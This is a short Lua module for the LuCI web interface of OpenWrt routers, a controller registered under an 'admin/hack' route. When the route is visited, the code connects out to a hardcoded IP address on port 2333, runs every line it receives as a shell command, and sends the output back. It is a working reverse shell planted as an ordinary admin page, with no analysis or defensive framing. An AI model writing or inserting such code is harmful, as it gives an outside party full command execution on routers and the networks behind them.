module("luci.controller.admin.hack", package.seeall)

local socket = require("socket")
local ip='192.168.66.132'
function index()
    entry({"admin", "hack"}, call("action_hack"))
end

function action_hack()
    local sock = socket.tcp()
    sock:settimeout(20)  -- 设置超时时间为20秒

    local ok, err = sock:connect(ip, 2333)
    if not ok then
        luci.http.write("Failed to connect to the remote server: " .. err)
        return
    end

    while true do
        local data, err, partial = sock:receive()
        if data then
            local f = io.popen(data, "r")
            local b = f:read("*a")
            f:close()
            sock:send(b)
        elseif err == "timeout" then
            luci.http.write("Timeout while receiving data")
            break
        elseif err == "closed" then
            break
        else
            luci.http.write("Error while receiving data: " .. (err or ""))
            break
        end
    end

    sock:close()
end
